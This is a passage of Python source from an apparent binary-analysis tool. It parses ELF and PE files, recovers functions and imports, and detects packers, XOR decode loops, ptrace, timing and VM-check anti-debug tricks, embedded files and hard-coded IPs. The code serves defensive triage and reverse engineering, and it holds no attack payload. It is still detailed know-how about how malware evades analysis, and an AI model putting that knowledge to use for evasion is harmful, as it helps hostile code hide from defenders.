def _bin_x86_scan(ctx: _BinCtx) -> None:
    """Byte-pattern scans for x86/x86-64: PLT, calls, syscalls, rdtsc/cpuid/int3, xor loops, string refs."""
    d = ctx.data
    execs = [s for s in ctx.secs if s.exec and s.size]
    allocs = [s for s in ctx.secs if s.alloc and s.size]
    x64 = ctx.bits == 64
    # PLT stubs
    for s in execs:
        if not s.name.startswith(".plt"):
            continue
        code = d[s.off:s.off + s.size]
        for m in re.finditer(rb"\xff\x25(....)", code, re.S):
            disp = struct.unpack("<i", m.group(1))[0]
            got = (s.addr + m.start() + 6 + disp) & 0xFFFFFFFFFFFFFFFF if x64 else (disp & 0xFFFFFFFF)
            name = ctx.got.get(got)
            st = m.start()
            if st and code[st - 1] == 0xF2:
                st -= 1
            if st >= 4 and code[st - 4:st] == b"\xf3\x0f\x1e\xfa":
                st -= 4
            if name:
                ctx.plt[s.addr + st] = name
    ranges = sorted((s.addr, s.addr + s.size) for s in execs)

    def in_exec(va: int) -> bool:
        return any(a <= va < b for a, b in ranges)

    for s in execs:
        code = d[s.off:s.off + s.size]
        base = s.addr
        n = 0
        for m in re.finditer(rb"\xe8(....)", code, re.S):
            tgt = (base + m.start() + 5 + struct.unpack("<i", m.group(1))[0]) & 0xFFFFFFFFFFFFFFFF
            if in_exec(tgt) and len(ctx.calls) < 500000:
                ctx.calls.append((base + m.start(), tgt))
        for m in re.finditer(rb"\xff\x15(....)", code, re.S):
            disp = struct.unpack("<i", m.group(1))[0]
            got = (base + m.start() + 6 + disp) & 0xFFFFFFFFFFFFFFFF if x64 else disp & 0xFFFFFFFF
            if got in ctx.got:
                ctx.impcalls.append((base + m.start(), ctx.got[got]))
        for m in re.finditer(rb"\x0f\x31", code):
            ctx.sites["rdtsc"].append(base + m.start())
        for m in re.finditer(rb"\x0f\xa2", code):
            ctx.sites["cpuid"].append(base + m.start())
        if s.name.startswith(".plt"):
            continue
        # syscalls
        sc_pat = rb"\x0f\x05" if x64 else rb"\xcd\x80"
        for m in re.finditer(sc_pat, code):
            if ctx.is_pe:
                break
            i = m.start()
            win = code[max(0, i - 16):i]
            best: tuple[int, int] | None = None  # (end pos, number)
            for rx, conv in ((rb"\xb8(....)", lambda g: struct.unpack("<I", g[0])[0]),
                             (rb"\x48\xc7\xc0(....)", lambda g: struct.unpack("<I", g[0])[0]),
                             (rb"\xb0(.)", lambda g: g[0][0]),
                             (rb"\x66\xb8(..)", lambda g: struct.unpack("<H", g[0])[0]),
                             (rb"\x6a(.)\x58", lambda g: g[0][0]),
                             (rb"(?:\x48)?\x31\xc0", lambda g: 0)):
                for mm in re.finditer(rx, win, re.S):
                    if best is None or mm.end() >= best[0]:
                        best = (mm.end(), conv(mm.groups()))
            num = best[1] if best else None
            tbl = disasm.SYSCALLS if x64 else SYSCALLS_I386
            ctx.syscalls.append({"site": base + i, "number": num, "name": tbl.get(num, "?") if num is not None else "?"})
        # int3 (isolated cc)
        n3 = 0
        for m in re.finditer(rb"\xcc", code):
            i = m.start()
            if (i and code[i - 1] in (0xCC, 0xC3, 0x90, 0xE9, 0xEB)) or code[i + 1:i + 2] in (b"\xcc", b"\x90"):
                continue
            n3 += 1
            if n3 <= 20:
                ctx.sites["int3"].append(base + i)
        # xor patterns followed by a backward jump
        for rx in (rb"\x34(.)", rb"\x80[\xf0-\xf7](.)", rb"\x80\x34.(.)", rb"\x80\x74..(.)", rb"\x83[\xf0-\xf7](.)"):
            for m in re.finditer(rx, code, re.S):
                tail = code[m.end():m.end() + 32]
                if re.search(rb"[\xeb\x70-\x7f][\x80-\xff]|\xe9...[\x80-\xff]|\x0f[\x80-\x8f]...[\x80-\xff]", tail, re.S) and len(ctx.xor_sites) < 5000:
                    ctx.xor_sites.append({"site": base + m.start(), "key": m.group(1)[0]})
        # string/data references
        tgt_ok = lambda t: any(a.addr <= t < a.addr + a.size for a in allocs)  # noqa: E731
        if x64:
            for m in re.finditer(rb"[\x48\x4c]\x8d[\x05\x0d\x15\x1d\x25\x2d\x35\x3d](....)", code, re.S):
                t = (base + m.start() + 7 + struct.unpack("<i", m.group(1))[0]) & 0xFFFFFFFFFFFFFFFF
                if tgt_ok(t):
                    ctx.xrefs.append((base + m.start(), t))
        for m in re.finditer(rb"[\x68\xb8-\xbf](....)|\xc7\x04\x24(....)", code, re.S):
            t = struct.unpack("<I", m.group(1) or m.group(2))[0]
            if tgt_ok(t) and len(ctx.xrefs) < 1000000:
                ctx.xrefs.append((base + m.start(), t))
    ctx.xrefs = sorted(set(ctx.xrefs))
    ctx.calls = sorted(set(ctx.calls))


def _recover_functions(ctx: _BinCtx, syms: list[dict]) -> None:
    d = ctx.data
    text = [s for s in ctx.secs if s.exec and not s.name.startswith(".plt") and s.size]
    for s in syms:
        if s["type"] in ("FUNC", "IFUNC") and s["value"] and s["shndx"] != 0 and s["table"]:
            ctx.starts[s["value"]] = (s["name"], "symtab")
            ctx.sizes[s["value"]] = s["size"]
    ctx.starts.setdefault(ctx.entry, ("entry", "heuristic"))
    in_text = lambda va: any(t.addr <= va < t.addr + t.size for t in text)  # noqa: E731
    for _site, tgt in ctx.calls:
        if in_text(tgt) and tgt not in ctx.starts:
            ctx.starts[tgt] = (f"sub_{tgt:x}", "heuristic")
    for t in text:
        code = d[t.off:t.off + t.size]
        for m in re.finditer(rb"\xf3\x0f\x1e\xfa", code):
            if (t.addr + m.start()) % 16 == 0 and (t.addr + m.start()) not in ctx.starts and len(ctx.starts) < 30000:
                ctx.starts[t.addr + m.start()] = (f"sub_{t.addr + m.start():x}", "heuristic")
        for m in re.finditer(rb"\x55\x48\x89\xe5|\x55\x89\xe5", code):
            a = t.addr + m.start()
            if a not in ctx.starts and len(ctx.starts) < 30000:
                ctx.starts[a] = (f"sub_{a:x}", "heuristic")
    # main recovery (glibc _start)
    if ctx.entry and not ctx.is_pe:
        off = ctx.v2o(ctx.entry)
        if off is not None:
            code = d[off:off + 64]
            lsm = [site for site, n in ctx.impcalls if n == "__libc_start_main"]
            call_off = None
            for m in re.finditer(rb"\xe8(....)", code, re.S):
                tgt = (ctx.entry + m.start() + 5 + struct.unpack("<i", m.group(1))[0]) & 0xFFFFFFFFFFFFFFFF
                if ctx.plt.get(tgt) == "__libc_start_main":
                    call_off = m.start()
            for m in re.finditer(rb"\xff\x15(....)", code, re.S):
                if ctx.entry + m.start() in lsm:
                    call_off = m.start()
            if call_off is not None:
                pre = code[:call_off]
                main = None
                if ctx.bits == 64:
                    for m in re.finditer(rb"\x48\xc7\xc7(....)", pre, re.S):
                        main = struct.unpack("<i", m.group(1))[0] & 0xFFFFFFFF
                    for m in re.finditer(rb"\x48\x8d\x3d(....)", pre, re.S):
                        main = (ctx.entry + m.start() + 7 + struct.unpack("<i", m.group(1))[0]) & 0xFFFFFFFFFFFFFFFF
                    for m in re.finditer(rb"\xc7\xc7(....)", pre, re.S):
                        pass
                else:
                    for m in re.finditer(rb"\x68(....)", pre, re.S):
                        main = struct.unpack("<I", m.group(1))[0]
                if main and in_text(main):
                    ctx.main = main
                    nm, src = ctx.starts.get(main, ("main", "heuristic"))
                    ctx.starts[main] = ("main", src if src == "symtab" else "heuristic")
    for a, (nm, src) in list(ctx.starts.items()):
        if nm == "main" and src == "symtab":
            ctx.main = a


# ---------- binary lane: PE
def _pe_imports(data: bytes, pe: dict, ctx: _BinCtx) -> list[dict]:
    try:
        lfanew = struct.unpack_from("<I", data, 0x3C)[0]
        opt = lfanew + 24
        plus = pe["plus"]
        dd = opt + (112 if plus else 96)
        irva, isz = struct.unpack_from("<II", data, dd + 8)
        net_rva, _ = struct.unpack_from("<II", data, dd + 14 * 8)
    except struct.error:
        return []
    ctx_net = net_rva != 0
    pe["dotnet"] = ctx_net

    def r2o(rva: int) -> int | None:
        for s in pe["sections"]:
            if s["va"] <= rva < s["va"] + max(s["vsize"], s["size"]):
                return s["off"] + rva - s["va"]
        return None
    out: list[dict] = []
    if not irva:
        return out
    o = r2o(irva)
    if o is None:
        return out
    for _ in range(256):
        if o + 20 > len(data):
            break
        oft, _ts, _fc, name_rva, ft = struct.unpack_from("<IIIII", data, o)
        if not (oft or name_rva or ft):
            break
        no = r2o(name_rva)
        dll = data[no:no + 64].split(b"\0")[0].decode("latin-1") if no is not None else "?"
        to = r2o(oft or ft)
        step = 8 if pe["plus"] else 4
        while to is not None and to + step <= len(data) and len(out) < 4096:
            val = int.from_bytes(data[to:to + step], "little")
            if val == 0:
                break
            if val >> (step * 8 - 1):
                nm = f"#{val & 0xFFFF}"
            else:
                ho = r2o(val & 0x7FFFFFFF)
                nm = data[ho + 2:ho + 2 + 128].split(b"\0")[0].decode("latin-1") if ho is not None else "?"
            out.append({"name": nm, "lib": dll})
            to += step
        o += 20
    return out


def _tag_strings(b: dict, ctx: _BinCtx, imports: set[str], flag_re: re.Pattern) -> None:
    d = ctx.data
    found: list[dict] = []
    for rx, enc in ((_ASCII_S, "ascii"), (_UTF16_S, "utf-16le")):
        for m in rx.finditer(d):
            if len(found) >= MAX_FINDINGS:
                break
            try:
                v = m.group().decode(enc)
            except UnicodeDecodeError:
                continue
            found.append({"value": v, "offset": m.start(), "_len": len(m.group())})
    for s in found:
        off = s["offset"]
        sec = ctx.sec_of_off(off)
        va = ctx.o2v(off)
        s["vaddr"], s["section"] = va, sec.name if sec else ""
        tags: list[str] = []
        v = s["value"]
        if FLAG_RE.search(v) or flag_re.search(v):
            tags.append("FLAG")
        for tg, rx in _STR_TAG_RES:
            if rx.search(v):
                tags.append(tg)
        if _IP_RE.search(v):
            tags.append("IP")
        if len(v) >= 16 and re.fullmatch(r"[A-Za-z0-9+/]+={0,2}", v):
            bb = decode.b64_decode(v)
            if bb and decode.printable_ratio(bb) >= 0.9:
                tags.append("B64")
                s["decoded"] = bb.decode("latin-1")[:60]
        if len(v) >= 16 and len(v) % 2 == 0 and re.fullmatch(r"[0-9a-fA-F]+", v):
            bb = bytes.fromhex(v)
            tags.append("HEX")
            if decode.printable_ratio(bb) >= 0.9:
                s["decoded"] = bb.decode("latin-1")[:60]
        if v in imports:
            tags.append("LIBC")
        s["tags"] = list(dict.fromkeys(tags))
    # xrefs
    xs = sorted(ctx.xrefs, key=lambda x: x[1])
    tg = [t for _s, t in xs]
    import bisect
    for s in found:
        s["xrefs"] = []
        if s["vaddr"] is None:
            continue
        lo = bisect.bisect_left(tg, s["vaddr"])
        hi = bisect.bisect_left(tg, s["vaddr"] + s["_len"])
        for i in range(lo, min(hi, lo + 32)):
            s["xrefs"].append({"site": xs[i][0], "function": None})
    b["strings"] = found


def _func_index(b: dict) -> tuple[list[int], list[dict]]:
    fs = sorted(b["functions"], key=lambda f: f["addr"])
    return [f["addr"] for f in fs], fs


def _func_at(b: dict, addr: int, _idx: dict = {}) -> dict | None:  # noqa: B006
    import bisect
    keys, fs = b["_fidx"]
    i = bisect.bisect_right(keys, addr) - 1
    if i < 0:
        return None
    f = fs[i]
    return f if addr < f["addr"] + max(f["size"], 1) else None


def _bin_digest(b: dict, ctx: _BinCtx, report: Report) -> None:
    """Recompute per-function facts over the (possibly engine-provided) function ranges."""
    for f in b["functions"]:
        for k in ("calls", "imports_called", "strings", "crypto", "syscalls", "tags", "actions"):
            f[k] = []
        f["interest"] = 0
    b["_fidx"] = _func_index(b)
    strmap = sorted([s for s in b["strings"] if s.get("xrefs")], key=lambda s: s["vaddr"])
    for s in b["strings"]:
        for x in s["xrefs"]:
            fn = _func_at(b, x["site"])
            x["function"] = fn["name"] if fn else None
            if fn is not None:
                fn["strings"].append(s)
    for site, name in ctx.impcalls:
        fn = _func_at(b, site)
        if fn is not None:
            fn["imports_called"].append(name)
    for site, tgt in ctx.calls:
        fn = _func_at(b, site)
        callee = ctx.plt.get(tgt)
        if fn is None:
            continue
        if callee:
            fn["imports_called"].append(callee)
        else:
            cf = _func_at(b, tgt)
            if cf is not None and cf["addr"] == tgt and cf["name"] != fn["name"] and cf["name"] not in fn["calls"]:
                fn["calls"].append(cf["name"])
    for sc in b["syscalls"]:
        fn = _func_at(b, sc["site"])
        sc["function"] = fn["name"] if fn else None
        if fn:
            fn["syscalls"].append(sc)
    for h in b["crypto"]:
        if h.get("vaddr") is not None:
            fn = _func_at(b, h["vaddr"])
            if fn:
                fn["crypto"].append(h)
            h["function"] = fn["name"] if fn else None
    ad_sites = {"rdtsc": b["_sites"]["rdtsc"], "cpuid": b["_sites"]["cpuid"], "int3": b["_sites"]["int3"]}
    for kind, sites in ad_sites.items():
        for s in sites:
            fn = _func_at(b, s)
            if fn:
                fn["tags"].append(kind)
    for x in b["xor_sites"]:
        fn = _func_at(b, x["site"])
        x["function"] = fn["name"] if fn else None
        if fn:
            fn["tags"].append(f"xor:{x['key']:#x}")
    for a in b["antidebug"]:
        if a.get("site") is not None:
            fn = _func_at(b, a["site"])
            a["function"] = fn["name"] if fn else None
    # actions + interest
    blocks: list[Block] = []
    for f in b["functions"]:
        acts: list[str] = []
        cats: set[str] = set()
        strs = sorted(f["strings"], key=lambda s: min((_TAG_RANK.get(t, 9) for t in s["tags"]), default=9))
        shown = [s for s in strs if any(t in ("FLAG", "PROMPT", "URL", "IP") for t in s["tags"])][:3] or strs[:1]
        for s in shown:
            acts.append(f'refs "{_snip(s["value"], 40)}"')
        interest = 5 * sum(1 for s in f["strings"] if {"FLAG", "PROMPT"} & set(s["tags"]))
        for name in dict.fromkeys(f["imports_called"]):
            api = _api_lookup(name)
            cat = api[0] if api else None
            if cat:
                cats.add(cat)
            label = {"ANTI_ANALYSIS": " (anti-debug)", "COMPARE_CHECK": " (COMPARE_CHECK)"}.get(cat or "", f" ({cat})" if cat else "")
            if cat != "OUTPUT":
                acts.append(f"calls {name}{label}")
            interest += 4 if cat == "ANTI_ANALYSIS" else 4 if cat == "CRYPTO" else 3 if cat == "COMPARE_CHECK" else 2 if cat in ("NETWORK", "EXEC") else 1
        for sc in f["syscalls"]:
            acts.append(f"syscall {sc['name']} ({sc['number']})")
            if sc["name"] == "ptrace":
                cats.add("ANTI_ANALYSIS")
                interest += 4
            elif sc["name"] in ("execve",):
                cats.add("EXEC")
                interest += 2
            elif sc["name"] in ("socket", "connect"):
                cats.add("NETWORK")
                interest += 2
            else:
                interest += 1
        if "rdtsc" in f["tags"]:
            acts.append("rdtsc timing check")
            cats.add("ANTI_ANALYSIS")
            interest += 4
        if "cpuid" in f["tags"]:
            acts.append("cpuid (VM check?)")
            interest += 1
        for h in f["crypto"]:
            acts.append(f"uses {h['name']} @{h['vaddr']:#x}")
            cats.add("CRYPTO")
            interest += 4
        xk = [t for t in f["tags"] if t.startswith("xor:")]
        if xk:
            acts.append(f"loop with xor imm {xk[0][4:]} (possible XOR decode)")
            cats.add("CRYPTO")
            interest += 1
        if f["calls"]:
            acts.append("calls " + ", ".join(f["calls"][:4]))
        if any("FLAG" in s["tags"] or "PROMPT" in s["tags"] for s in f["strings"]):
            cats.add("INPUT" if any("PROMPT" in s["tags"] for s in f["strings"]) else "OUTPUT")
        f["actions"] = list(dict.fromkeys(acts))
        f["interest"] = interest
        f["categories"] = sorted(cats, key=CATEGORIES.index)
    ranked = sorted(b["functions"], key=lambda f: (0 if f["name"] == "main" else 1, -f["interest"], f["addr"]))
    b["functions"] = ranked
    for f in ranked:
        if f["interest"] == 0 and f["source"] in ("heuristic",):
            continue
        end = f["addr"] + max(f["size"], 1)
        summ = f"binary-function `{f['name']}` ({f['addr']:#x}-{end:#x}): " + ("; ".join(f["actions"][:6]) or "no notable operations") + "."
        blocks.append(Block("bin", "binary-function", f["name"], f["addr"], end, f["categories"], f["actions"], f["calls"],
                            [Evidence(f"{f['addr']:#x}", a, "bin") for a in f["actions"][:3]], summ, f["confidence"]))
    report.blocks = [x for x in report.blocks if x.kind != "binary-function"] + blocks[:MAX_FINDINGS]
    del b["_fidx"]


def _bin_common(data: bytes, ctx: _BinCtx, b: dict, report: Report, opts: Options, imports: list[dict]) -> None:
    fre = _flag_re(report)
    # sections & entropy
    ents = []
    for s in ctx.secs:
        if not s.name or s.size == 0 or s.type == 8 or s.off >= len(data):
            continue
        e = _ent(data[s.off:s.off + min(s.size, 8 << 20)])
        ents.append((s.name, e))
        b["sections"].append({"name": s.name, "offset": s.off, "size": s.size, "entropy": round(e, 2),
                              "note": triage.entropy_note(e, s.size), "exec": s.exec})
    tids = {t.id for t in report.tells}
    names = [s.name for s in ctx.secs]
    pk = b["packer"]
    if any(n in ("UPX0", "UPX1", "UPX2") for n in names) or b"UPX!" in data[:4096] or b"$Info: This file is packed with the UPX" in data:
        pk["upx"] = True
        _add_tell(report, "T-UPX", "off:0x0", "UPX packer markers", "section names / UPX! magic", "high")
    tx = next((e for n, e in ents if n in (".text", "CODE")), 0)
    if (tx >= 7.2 or triage.entropy(data[:1 << 20]) >= 7.4 and len(imports) < 5) and not pk["upx"]:
        pk["packed"] = True
        _add_tell(report, "T-PACKED", "off:0x0", "high-entropy code / few imports", f".text entropy {tx:.2f}", "medium", "high")
    elif pk["upx"]:
        pk["packed"] = True
    if re.search(rb"MEI\x0c\x0b\x0a\x0b\x0e", data) or b"_MEIPASS" in data or b"pyi-" in data:
        pk["pyinstaller"] = True
        _add_tell(report, "T-PYINSTALLER", "off:0x0", "PyInstaller bundle markers", "MEI cookie / _MEIPASS", "high")
    if b".gopclntab" in data or b"Go build ID:" in data:
        pk["notes"].append("Go binary: function names may be recoverable from symbols/pclntab")
    if b"rust_panic" in data or b"/rustc/" in data:
        pk["notes"].append("Rust binary: function names may be mangled in symbols")
    for s in ctx.secs:
        if s.name in (".data", ".rodata", ".rdata") and 256 <= s.size <= (4 << 20):
            blob = data[s.off:s.off + s.size]
            run: list[int] = []
            for o in range(0, len(blob) - 255, 128):
                if _ent(blob[o:o + 256]) >= 7.5:
                    if run and o <= run[-1] + 128 + 128:
                        run.append(o)
                    else:
                        if run:
                            b["high_entropy"].append((run[0], run[-1] + 256, s))
                        run = [o]
            if run:
                b["high_entropy"].append((run[0], run[-1] + 256, s))
    b["high_entropy"] = [{"offset": s.off + a, "vaddr": (s.addr + a) if s.addr else None, "size": e - a, "entropy": 7.5}
                         for a, e, s in b["high_entropy"][:20]]
    # strings
    _tag_strings(b, ctx, {i["name"] for i in imports}, fre)
    # crypto
    for h in scan_crypto_constants(data):
        sec = ctx.sec_of_off(h["offset"])
        va = ctx.o2v(h["offset"])
        h["section"] = sec.name if sec else ""
        h["vaddr"] = va
        b["crypto"].append(h)
    # anti-debug / syscalls / timing
    ad = b["antidebug"]
    for sc in ctx.syscalls:
        b["syscalls"].append(sc)
        if sc["name"] == "ptrace":
            ad.append({"kind": "ptrace-syscall", "site": sc["site"], "function": None, "detail": "ptrace syscall", "confidence": "high"})
            _add_tell(report, "T-PTRACE", f"{sc['site']:#x}", "ptrace syscall", "self-ptrace anti-debug", "high")
        elif sc["name"] in ("mprotect",):
            _add_tell(report, "T-SELF-MODIFY", f"{sc['site']:#x}", "mprotect syscall", "", "medium")
    for kind in ("rdtsc", "cpuid"):
        if len(ctx.sites[kind]) > 8:  # raw byte pattern matches in big binaries are mostly operand bytes
            report.notes.append(f"{len(ctx.sites[kind])} {kind} byte patterns found; treated as noise (>8)")
            ctx.sites[kind] = []
    for s in ctx.sites["rdtsc"][:50]:
        ad.append({"kind": "rdtsc", "site": s, "function": None, "detail": "rdtsc timing check", "confidence": "medium"})
        _add_tell(report, "T-TIMING", f"{s:#x}", "rdtsc instruction", "timing check", "medium")
    for s in ctx.sites["cpuid"][:50]:
        ad.append({"kind": "cpuid", "site": s, "function": None, "detail": "cpuid (VM check?)", "confidence": "low"})
        _add_tell(report, "T-VM-CHECK", f"{s:#x}", "cpuid instruction", "", "low")
    if 1 <= len(ctx.sites["int3"]) <= 8:
        for s in ctx.sites["int3"]:
            ad.append({"kind": "int3", "site": s, "function": None, "detail": "isolated int3 (heuristic)", "confidence": "low"})
        _add_tell(report, "T-ANTI-DEBUG", f"{ctx.sites['int3'][0]:#x}", "int3 traps", "heuristic; may be an immediate", "low")
    for s in b["strings"]:
        v = s["value"]
        loc = f"{s['vaddr']:#x}" if s["vaddr"] is not None else f"off:{s['offset']:#x}"
        if re.search(r"/proc/self/(status|maps)|TracerPid", v):
            ad.append({"kind": "string", "site": None, "function": None, "detail": f'"{v}" string (TracerPid check?)', "confidence": "medium"})
            _add_tell(report, "T-PROC-SELF", loc, "reads /proc/self", v, "medium")
        elif re.search(r"LD_PRELOAD|\bgdb\b|frida", v, re.I):
            _add_tell(report, "T-ANTI-DEBUG", loc, "anti-debug string", v, "low")
        elif re.search(r"vmware|VBox|QEMU", v, re.I):
            _add_tell(report, "T-VM-CHECK", loc, "VM-detection string", v, "low")
    # xor loops
    hist = collections.Counter(x["key"] for x in ctx.xor_sites)
    b["xor_sites"] = ctx.xor_sites[:200]
    b["xor_keys"] = [[k, c] for k, c in hist.most_common(5) if c >= 2 or len(data) < 65536]
    for k, c in b["xor_keys"][:3]:
        _add_tell(report, "T-XOR-LOOP", "off:0x0", f"possible single-byte XOR key {k:#04x}", f"{c} sites", "low")
    # embedded files
    for h in binextras.scan_signatures(data[:16 << 20]):
        if h["offset"] > 0 and len(h["magic_hex"]) >= 8 and "MZ" not in h["name"] and "BMP" not in h["name"]:
            if len(b["embedded"]) < 20:
                b["embedded"].append({"offset": h["offset"], "name": h["name"]})
    if b["embedded"]:
        _add_tell(report, "T-EMBEDDED-FILE", f"off:{b['embedded'][0]['offset']:#x}", "embedded file signature", b["embedded"][0]["name"], "low", "medium")
    # IOCs
    for s in b["strings"][:MAX_FINDINGS]:
        loc = f"{s['vaddr']:#x}" if s["vaddr"] is not None else f"off:{s['offset']:#x}"
        for i in extract_iocs(s["value"], "x", fre, ("from-binary",)):
            i.loc = loc
            _merge_iocs(report, [i])
            if i.type in ("ip", "ip_port") and not ({"private", "loopback", "link-local", "multicast"} & set(i.tags)):
                _add_tell(report, "T-HARDCODED-IP", loc, "hard-coded IP address", i.value, "medium")
        if len(report.iocs) >= MAX_FINDINGS:
            break
    # imports -> categories, tells
    for imp in imports:
        api = _api_lookup(imp["name"])
        imp["category"] = api[0] if api else None
        if api and api[1]:
            _add_tell(report, api[1], f"import:{imp['name']}", f"imports {imp['name']}", imp.get("lib") or "", "high")
        if imp["name"] == "mprotect":
            _add_tell(report, "T-SELF-MODIFY", "import:mprotect", "imports mprotect", "", "medium")
    b["imports"] = imports


def analyze_binary(data: bytes, path: str | None, opts: Options, report: Report, engines: Engines) -> None:
    """Binary lane: builtin stdlib digest, then optional r2 / ghidra augmentation and merge."""
    t0 = time.time()
    st = EngineStatus("builtin", "ok", "stdlib", "", "", 0.0)
    report.engines["builtin"] = st
    b: dict = {"format": "", "arch": "", "bits": 0, "endian": "little", "type": "", "entry": 0, "interp": None,
               "static": False, "stripped": False, "protections": {}, "sections": [], "packer": {"upx": False, "packed": False, "pyinstaller": False, "notes": []},
               "imports": [], "exports": [], "functions": [], "main": None, "strings": [], "crypto": [], "antidebug": [],
               "syscalls": [], "xor_sites": [], "xor_keys": [], "high_entropy": [], "embedded": [], "disasm": {"main": "", "functions": {}},
               "decompiled": {}, "_sites": {}}
    report.binary = b
    report.lane = "binary"
    if data[:4] == b"\x7fELF":
        ctx, imports = _bin_elf(data, b, report)
    elif data[:2] == b"MZ":
        ctx, imports = _bin_pe(data, b, report)
    else:
        raise ValueError("not an ELF/PE file")
    b["_sites"] = ctx.sites
    _bin_common(data, ctx, b, report, opts, imports)
    # engines
    _run_engines(data, path, opts, report, engines, b, ctx)
    # functions -> dicts
    if not b["functions"] and not ctx.is_pe:
        b["functions"] = []
    for s_ in b["strings"]:  # strings contributed by an engine: IOC scan too
        if "_len" not in s_ and not s_.get("ioc_done"):
            s_["ioc_done"] = True
            loc = f"{s_['vaddr']:#x}" if s_.get("vaddr") is not None else f"off:{s_.get('offset', 0):#x}"
            for i in extract_iocs(s_["value"], "x", _flag_re(report), ("from-binary",)):
                i.loc = loc
                _merge_iocs(report, [i])
    _stage(report, "digest", _bin_digest, b, ctx, report)
    # disasm
    _stage(report, "disasm", _bin_disasm, data, ctx, b, opts)
    del b["_sites"]
    if b["main"] is None and ctx.main:
        b["main"] = ctx.main
    for imp in b["imports"]:
        pass
    st.seconds = round(time.time() - t0, 2)


def _bin_elf(data: bytes, b: dict, report: Report) -> tuple[_BinCtx, list[dict]]:
    info = triage.parse_elf(data)
    secs, is64, e = _elf_sections_full(data)
    mach = triage.ELF_MACHINES.get(info["machine"], f"machine {info['machine']:#x}")
    arch = {3: "x86", 62: "x86_64"}.get(info["machine"], mach)
    ctx = _BinCtx(data, False, 64 if is64 else 32, arch, info["entry"])
    ctx.secs = secs
    b.update({"format": "ELF64" if is64 else "ELF32", "arch": mach, "bits": ctx.bits, "endian": info["endian"],
              "type": triage.ELF_TYPES.get(info["type"], str(info["type"])), "entry": info["entry"], "interp": info["interp"]})
    b["protections"] = triage.elf_protections(data, info)
    if "DISABLED" in b["protections"].get("NX", ""):
        _add_tell(report, "T-EXEC-STACK", "off:0x0", "NX disabled", b["protections"]["NX"], "medium")
    names = {s.name for s in secs}
    b["static"] = info["interp"] is None and ".dynamic" not in names
    b["stripped"] = ".symtab" not in names
    if b["stripped"]:
        _add_tell(report, "T-STATIC-STRIPPED", "off:0x0", "stripped" + (", static" if b["static"] else ""), "no .symtab", "high")
    try:
        syms = elf_symbols(data)
    except (struct.error, ValueError, IndexError) as exc:
        syms = []
        report.notes.append(f"symbols unavailable: {exc}")
    imports = []
    for s in syms:
        if s["table"] == ".dynsym" and s["shndx"] == 0 and s["name"]:
            imports.append({"name": s["name"].split("@")[0], "category": None, "lib": "", "plt": None})
        elif s["table"] == ".dynsym" and s["bind"] in ("GLOBAL", "WEAK") and s["type"] in ("FUNC", "OBJECT") and s["shndx"] != 0 and s["name"]:
            b["exports"].append({"name": s["name"].split("@")[0], "addr": s["value"]})
    imports = list({i["name"]: i for i in imports}.values())
    try:
        ctx.got = {g["got"]: g["symbol"].split("@")[0] for g in pwnhelp.got_plt(data)}
    except (struct.error, ValueError, IndexError, KeyError):
        ctx.got = {}
    try:
        ctx.elf = disasm.parse_elf(data)  # type: ignore[attr-defined]
    except disasm.ElfError:
        ctx.elf = None  # type: ignore[attr-defined]
        report.notes.append("section map unavailable")
    if info["machine"] in (3, 62):
        _stage(report, "x86-scan", _bin_x86_scan, ctx)
        for stub, nm in ctx.plt.items():
            for imp in imports:
                if imp["name"] == nm:
                    imp["plt"] = stub
        _stage(report, "functions", _recover_functions, ctx, syms)
        try:
            if ctx.elf and disasm.get_section(ctx.elf, ".text"):
                x = disasm.find_xrefs(data, ctx.elf)
                ctx.xrefs = sorted(set(ctx.xrefs) | {(s, t) for s, t, _v in x["strings"]})
        except Exception:  # noqa: BLE001
            pass
    else:
        report.notes.append(f"code scan: n/a for {mach}")
    ends = sorted(ctx.starts)
    import bisect
    for a in ends:
        nm, src = ctx.starts[a]
        sz = ctx.sizes.get(a, 0)
        if not sz:
            i = bisect.bisect_right(ends, a)
            sec = ctx.sec_of_va(a)
            lim = (sec.addr + sec.size) if sec else a + 64
            sz = (ends[i] if i < len(ends) else lim) - a
            sz = max(1, min(sz, lim - a))
        b["functions"].append({"name": nm, "addr": a, "size": sz, "source": src, "confidence": "high" if src == "symtab" else "low"})
    b["main"] = ctx.main
    return ctx, imports


def _bin_pe(data: bytes, b: dict, report: Report) -> tuple[_BinCtx, list[dict]]:
    pe = triage.parse_pe(data)
    plus = pe["plus"]
    ctx = _BinCtx(data, True, 64 if plus else 32, "x86_64" if pe["machine"] == "x86-64" else "x86", pe["base"] + pe["entry"])
    for s in pe["sections"]:
        isx = s["name"] in (".text", "CODE", "UPX0", "UPX1") or s["va"] <= pe["entry"] < s["va"] + max(s["vsize"], s["size"])
        ctx.secs.append(_Sec(s["name"], s["off"], s["size"], pe["base"] + s["va"], 6 if isx else 2, 1))
        ctx.secs[-1].flags = (4 | 2) if isx else 2
    b.update({"format": "PE32+" if plus else "PE32", "arch": pe["machine"], "bits": ctx.bits, "type": "DLL" if pe["dll"] else "EXE",
              "entry": ctx.entry, "protections": {"subsystem": pe["subsystem"]}})
    raw = _pe_imports(data, pe, ctx)
    imports = list({i["name"]: {"name": i["name"], "category": None, "lib": i["lib"], "plt": None} for i in raw}.values())
    if pe.get("dotnet"):
        _add_tell(report, "T-DOTNET", "off:0x0", ".NET managed assembly", "CLR header present", "high")
        report.next_steps.append("managed assembly: use ILSpy/dnSpy (not bundled)")
    else:
        _stage(report, "pe-scan", _bin_x86_scan, ctx)
    report.notes.append("function list requires r2/ghidra for PE")
    if ctx.sites["rdtsc"] is not None:
        pass
    return ctx, imports


def _bin_disasm(data: bytes, ctx: _BinCtx, b: dict, opts: Options) -> None:
    elf = getattr(ctx, "elf", None) or {"bits": ctx.bits}

    def dis(addr: int, n: int) -> str:
        off = ctx.v2o(addr)
        if off is None:
            return f"{addr:#x} not mapped"
        code = data[off:off + n * 15]
        if disasm.capstone is None:
            return disasm.NO_CAPSTONE_MSG + "\n" + disasm.hexdump(code[:64], addr)
        return disasm.disassemble(code, addr, elf, max_insn=n)
    tgt = b["main"] or ctx.main or ctx.entry
    b["disasm"]["main"] = f"{'main' if (b['main'] or ctx.main) else 'entry'} {tgt:#x}\n" + dis(tgt, 16)
    if opts.deep:
        for f in b["functions"][:8]:
            b["disasm"]["functions"][f["name"]] = dis(f["addr"], 64)


# ---------- engines: radare2
def _jaddr(d: dict) -> Any:
    return d.get("addr", d.get("offset", d.get("vaddr", d.get("from"))))


def _jname(d: dict) -> str:
    return str(d.get("name") or d.get("realname") or d.get("flagname") or "")


class _R2Sub:
    """radare2 via one subprocess per phase (``r2 -2 -q -c <batch>``)."""

    def __init__(self, r2: str, path: str, timeout: int) -> None:
